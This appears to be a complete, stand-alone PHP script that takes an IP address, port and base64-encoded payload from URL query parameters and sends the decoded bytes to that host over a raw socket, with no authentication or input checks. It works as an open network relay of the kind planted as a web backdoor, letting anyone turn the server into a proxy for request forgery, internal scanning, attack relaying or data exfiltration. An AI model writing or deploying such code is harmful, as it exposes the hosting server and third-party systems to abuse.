<?php
$ip = $_GET['ip'];
$port = (int)$_GET['port'];
$data = base64_decode($_GET['data']);
$socket = fsockopen($ip, $port);
fwrite($socket, $data);
fclose($socket);
?>
